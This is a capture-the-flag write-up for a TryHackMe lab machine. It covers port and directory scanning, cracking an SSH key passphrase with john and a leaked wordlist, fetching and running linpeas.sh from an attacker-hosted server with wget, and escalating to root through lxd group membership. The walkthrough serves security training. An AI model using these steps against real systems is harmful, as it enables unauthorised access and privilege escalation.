# THM-GamingServer-Write-up

## Task 1

User flag

First, we will be doing `Nmap` scan.

Command:

`nmap -sV -sC -p- --open MACHINE_IP`

![image](https://github.com/L43371/THM-GamingServer-Write-up/assets/129752764/1f20dff3-7f74-4f43-82d9-7b1845a64b70)

We can see there are 2 open ports

PORT 22 - SSH

PORT 80 - HTTP

Next, we will be using the tool `Gobuster` to check for any web directories.

Command:

gobuster dir -u 10.10.235.141 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

![image](https://github.com/L43371/THM-GamingServer-Write-up/assets/129752764/e549205a-0d17-4fed-9433-ef580570913e)

We can see there are 2 interesting directories, checking both directories, uploads has files and the secret has a RSA ID.

Uploads has some interesting files

![image](https://github.com/L43371/THM-GamingServer-Write-up/assets/129752764/b90cbd72-e36d-4d69-9856-4f4fdadd4f99)

We will download all the files as the dict.lst, looks like a password list that we can use to bruteforce and the other files might have some files inside. 

I am trying to find any username or name but nothing I can find, I went back to the main page and check the page source and see a note.

![image](https://github.com/L43371/THM-GamingServer-Write-up/assets/129752764/79fe8390-4706-4f59-b7be-fdd3c67f72f1)

Now we got a name, password list, and RSA key, I think if I try to login to SSH it will ask for a passphrase, we will use a tool called `ssh2john` to retrieve the hash.
Command:

`./ssh2john.py secretKey > hash.txt`

And we will use the tool `john` to decrypt it and get the passphrase.

Command:

`john --wordlist=dict.lst hash.txt`

and we got a password/passphase!

![image](https://github.com/L43371/THM-GamingServer-Write-up/assets/129752764/8e8dbeca-9339-4716-a601-ab5c434dd9a8)

We will now try to SSH using the **john** username, RSA key and the passphrase.

![image](https://github.com/L43371/THM-GamingServer-Write-up/assets/129752764/2d127d6c-c095-4604-9d8d-52d57e2bdefd)

We are in.

And now, we can retrieve the first flag.

![image](https://github.com/L43371/THM-GamingServer-Write-up/assets/129752764/dde0173b-fe9d-4d02-a169-b8f087364b3d)

## Task 2

Escalate our privilege and retrieve the root flag

I tried running `sudo -l` but it ask for password, which we do not have, we will use a tool called `linpeas.sh`, we will move to tmp directory. 

And now open a new terminal tab and we will open a http server to our machine.

Command:

`python -m http.server`

![image](https://github.com/L43371/THM-GamingServer-Write-up/assets/129752764/32b0155f-ccf9-4871-bdca-f54fe3924c35)

We will go back to the SSH and we will do a `wget` command, to get the linpeas.sh tool.

Command:

`wget http://MACHINE_IP:8000/linpeas.sh`

Once we got the `linpeas.sh` tool, we will change the permission of the file.

Command:

`chmod 700 linpeas.sh`

And we will run it using command `./linpeas.sh`.

Checking the result, I noticed that the user john is part of lxd group.

![image](https://github.com/L43371/THM-GamingServer-Write-up/assets/129752764/7ef71166-8626-4ebd-945d-a713d74c9842)

We will download a tool called [build-alpine](https://github.com/saghul/lxd-alpine-builder?search=1) and build it to our machine and do another wget to our SSH connection.

By following this guide from Hacktricks site, https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.

We can escalate ourself as root and retrieve the root flag.

![image](https://github.com/L43371/THM-GamingServer-Write-up/assets/129752764/781d5f5e-8eab-4540-ac56-39715519403b)



